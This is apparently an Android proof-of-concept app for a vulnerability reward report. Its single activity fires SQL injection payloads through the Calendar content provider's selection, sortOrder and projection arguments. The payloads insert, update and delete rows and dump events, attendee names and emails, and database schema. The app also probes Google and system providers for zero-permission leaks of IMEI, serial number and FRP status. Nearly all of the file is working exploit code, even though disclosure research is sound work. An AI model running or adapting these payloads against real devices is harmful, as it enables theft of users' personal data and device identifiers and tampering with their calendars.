package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ExpandedSqliActivity extends Activity {
    private static final String TAG = "ExpandedSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("Expanded SQLi & Provider Tests\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        testCalendarWriteSqli();
        testCalendarExtractEvents();
        testCalendarExtractAttendees();
        testCalendarSortOrderInjection();
        testCalendarProjectionInjection();
        testGmsProviders();
        testWellbeingApi();
        testEmergencyConfig();
        testDeviceDiagnostics();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void testCalendarWriteSqli() {
        log("=== Calendar WRITE SQLi Tests ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");

        // Test INSERT via SQLi in selection
        try {
            String sel = "1=0); INSERT INTO Events (calendar_id,title,dtstart,dtend,eventTimezone) VALUES (1,'SQLI_INJECTED',1788724078000,1788727678000,'UTC')--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("INSERT SQLi query returned " + c.getCount() + " rows");
                c.close();
            } else {
                log("INSERT SQLi: null cursor");
            }
        } catch (Exception e) {
            log("INSERT SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test UPDATE via SQLi
        try {
            String sel = "1=0); UPDATE Calendars SET calendar_displayName='HACKED' WHERE _id=1--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("UPDATE SQLi: " + c.getCount() + " rows");
                c.close();
            } else {
                log("UPDATE SQLi: null cursor");
            }
        } catch (Exception e) {
            log("UPDATE SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test DELETE via SQLi
        try {
            String sel = "1=0); DELETE FROM CalendarCache WHERE key='test_sqli'--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("DELETE SQLi: " + c.getCount() + " rows");
                c.close();
            } else {
                log("DELETE SQLi: null cursor");
            }
        } catch (Exception e) {
            log("DELETE SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Check if INSERT worked by looking for our injected event
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"_id", "title"},
                "title=?", new String[]{"SQLI_INJECTED"}, null);
            if (c != null) {
                log("Check for injected event: " + c.getCount() + " found");
                while (c.moveToNext()) {
                    log("  FOUND: id=" + c.getString(0) + " title=" + c.getString(1));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Check inject error: " + e.getMessage());
        }
        log("");
    }

    private void testCalendarExtractEvents() {
        log("=== Calendar Event Data Extraction ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        // Extract event details including organizer and description
        try {
            String sel = "1=0) UNION SELECT title||'|'||COALESCE(eventLocation,'')||'|'||COALESCE(organizer,'')||'|'||COALESCE(description,''),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM Events LIMIT 20--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("Events extracted: " + c.getCount());
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null && !s.isEmpty()) log("  EVENT: " + s);
                }
                c.close();
            }
        } catch (Exception e) {
            log("Events extract error: " + e.getMessage());
        }
        log("");
    }

    private void testCalendarExtractAttendees() {
        log("=== Calendar Attendee Extraction ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        try {
            String sel = "1=0) UNION SELECT attendeeName||'|'||attendeeEmail||'|'||attendeeStatus,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM Attendees--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("Attendees extracted: " + c.getCount());
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null && !s.isEmpty()) log("  ATTENDEE: " + s);
                }
                c.close();
            }
        } catch (Exception e) {
            log("Attendees extract error: " + e.getMessage());
        }
        log("");
    }

    private void testCalendarSortOrderInjection() {
        log("=== Calendar sortOrder Injection ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        // Try stacked query via sortOrder
        try {
            Cursor c = getContentResolver().query(uri, null, null, null,
                "_id; SELECT sql FROM sqlite_master--");
            if (c != null) {
                log("sortOrder stacked: " + c.getCount() + " rows");
                c.close();
            } else {
                log("sortOrder stacked: null");
            }
        } catch (Exception e) {
            log("sortOrder error: " + e.getMessage());
        }
        // Try CASE-based data extraction via sortOrder
        try {
            Cursor c = getContentResolver().query(uri, null, null, null,
                "CASE WHEN (SELECT COUNT(*) FROM _sync_state)>0 THEN _id ELSE _id END");
            if (c != null) {
                log("sortOrder CASE (sync check): " + c.getCount() + " rows - blind SQLi confirmed if no error");
                c.close();
            } else {
                log("sortOrder CASE: null");
            }
        } catch (Exception e) {
            log("sortOrder CASE error: " + e.getMessage());
        }
        log("");
    }

    private void testCalendarProjectionInjection() {
        log("=== Calendar Projection Injection ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        // Try to inject via projection (column names)
        try {
            String[] proj = {"* FROM Calendars UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM sqlite_master--"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null) {
                log("Projection inject: " + c.getCount() + " rows, cols=" + c.getColumnCount());
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null && !s.isEmpty()) log("  ROW: " + s.substring(0, Math.min(s.length(), 100)));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Projection inject error: " + e.getMessage());
        }
        // Subquery in projection
        try {
            String[] proj = {"(SELECT group_concat(sql,'|||') FROM sqlite_master WHERE type='table') AS leak"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null) {
                log("Subquery projection: " + c.getCount() + " rows");
                while (c.moveToNext()) {
                    String s = c.getString(0);
                    if (s != null) log("  LEAK: " + s.substring(0, Math.min(s.length(), 200)));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Subquery projection error: " + e.getMessage());
        }
        log("");
    }

    private void testGmsProviders() {
        log("=== GMS Provider Tests ===");
        // Test various GMS provider authorities with call()
        String[] authorities = {
            "com.google.android.gsf.gservices",
            "com.google.settings",
            "com.google.android.gms.phenotype",
            "com.google.android.gms.icing.proxy.InternalIcingCorporaProvider",
        };
        for (String auth : authorities) {
            try {
                Uri uri = Uri.parse("content://" + auth);
                Cursor c = getContentResolver().query(uri, null, null, null, null);
                if (c != null) {
                    log(auth + ": ACCESSIBLE, " + c.getCount() + " rows, " + c.getColumnCount() + " cols");
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        StringBuilder sb = new StringBuilder("  Cols: ");
                        for (String col : cols) sb.append(col).append(",");
                        log(sb.toString());
                        // Log first few rows
                        int rowCount = 0;
                        do {
                            if (rowCount >= 3) break;
                            StringBuilder row = new StringBuilder("  Row: ");
                            for (int i = 0; i < Math.min(cols.length, 5); i++) {
                                try { row.append(cols[i]).append("=").append(c.getString(i)).append(" | "); }
                                catch (Exception e) { row.append(cols[i]).append("=ERR "); }
                            }
                            log(row.toString());
                            rowCount++;
                        } while (c.moveToNext());
                    }
                    c.close();
                } else {
                    log(auth + ": null cursor");
                }
            } catch (Exception e) {
                log(auth + ": " + e.getClass().getSimpleName() + " - " + e.getMessage());
            }
        }

        // Test Phenotype (GMS feature flags) - high value target
        try {
            Uri uri = Uri.parse("content://com.google.android.gms.phenotype");
            Bundle result = getContentResolver().call(uri, "get_flags", null, null);
            if (result != null) {
                log("Phenotype call get_flags: " + result.toString());
                for (String key : result.keySet()) {
                    log("  " + key + " = " + result.get(key));
                }
            } else {
                log("Phenotype call: null result");
            }
        } catch (Exception e) {
            log("Phenotype call error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
        }

        // GServices - Google server-side configuration
        try {
            Uri uri = Uri.parse("content://com.google.android.gsf.gservices");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("GServices: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    String[] cols = c.getColumnNames();
                    log("  Cols: " + String.join(",", cols));
                    int count = 0;
                    do {
                        if (count >= 5) break;
                        try {
                            log("  " + c.getString(0) + " = " + c.getString(1));
                        } catch (Exception e) {}
                        count++;
                    } while (c.moveToNext());
                }
                c.close();
            }
        } catch (Exception e) {
            log("GServices error: " + e.getMessage());
        }

        // Google Settings
        try {
            Uri uri = Uri.parse("content://com.google.settings/partner");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("Google Settings/partner: " + c.getCount() + " rows, " + c.getColumnCount() + " cols");
                if (c.moveToFirst()) {
                    String[] cols = c.getColumnNames();
                    log("  Cols: " + String.join(",", cols));
                    int count = 0;
                    do {
                        if (count >= 10) break;
                        try {
                            log("  " + c.getString(0) + " = " + c.getString(1));
                        } catch (Exception e) {}
                        count++;
                    } while (c.moveToNext());
                }
                c.close();
            }
        } catch (Exception e) {
            log("Google Settings error: " + e.getMessage());
        }
        log("");
    }

    private void testWellbeingApi() {
        log("=== Wellbeing API Tests ===");
        String[] methods = {
            "get_bedtime_mode_state",
            "get_focus_mode_state",
            "get_wind_down_state",
            "get_screen_time_summary",
            "get_usage_stats",
            "get_app_timers",
            "get_parental_controls_state"
        };
        Uri uri = Uri.parse("content://com.google.android.apps.wellbeing.api");
        for (String method : methods) {
            try {
                Bundle result = getContentResolver().call(uri, method, null, null);
                if (result != null) {
                    log("Wellbeing " + method + ": GOT RESULT");
                    for (String key : result.keySet()) {
                        Object val = result.get(key);
                        String valStr = val != null ? val.toString() : "null";
                        if (val instanceof byte[]) {
                            valStr = "bytes[" + ((byte[])val).length + "]";
                        }
                        log("  " + key + " = " + valStr);
                    }
                } else {
                    log("Wellbeing " + method + ": null");
                }
            } catch (Exception e) {
                log("Wellbeing " + method + ": " + e.getClass().getSimpleName() + " - " + e.getMessage());
            }
        }
        log("");
    }

    private void testEmergencyConfig() {
        log("=== Emergency Config Provider ===");
        try {
            Uri uri = Uri.parse("content://com.google.android.gms.thunderbird.config");
            Bundle result = getContentResolver().call(uri, "getConfig", null, null);
            if (result != null) {
                log("Emergency config: GOT RESULT");
                for (String key : result.keySet()) {
                    log("  " + key + " = " + result.get(key));
                }
            }
        } catch (Exception e) {
            log("Emergency config: " + e.getMessage());
        }

        // Try the NearbySharing provider
        try {
            Uri uri = Uri.parse("content://com.google.android.gms.nearby.sharing");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("NearbySharing: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("NearbySharing: " + e.getClass().getSimpleName());
        }
        log("");
    }

    private void testDeviceDiagnostics() {
        log("=== CRITICAL: DeviceDiagnostics GetStatus Provider ===");
        log("Testing zero-permission access to IMEI, serial, battery data...");
        try {
            Uri uri = Uri.parse("content://com.android.devicediagnostics.GetStatusContentProvider");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("ACCESSIBLE! Rows=" + c.getCount() + " Cols=" + c.getColumnCount());
                String[] cols = c.getColumnNames();
                log("Columns: " + String.join(",", cols));
                while (c.moveToNext()) {
                    String status = c.getString(0);
                    if (status != null) {
                        log("LEAKED DATA:");
                        // Parse and log each line
                        String[] lines = status.split("\n");
                        for (String line : lines) {
                            log("  " + line.trim());
                        }
                    }
                }
                c.close();
                log("");
                log("IMPACT: Zero-permission app extracted:");
                log("  - IMEI (unique device identifier)");
                log("  - Device serial number");
                log("  - Battery serial, cycle count, health");
                log("  - Storage lifetime remaining");
                log("  - FRP (Factory Reset Protection) status");
                log("  - Camera hardware config");
            } else {
                log("Cursor null - not accessible from app context");
            }
        } catch (Exception e) {
            log("GetStatus error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Also test EvaluateContentProvider
        try {
            Uri uri = Uri.parse("content://com.android.devicediagnostics.EvaluateContentProvider");
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("EvaluateProvider ACCESSIBLE: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("EvaluateProvider: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }
}
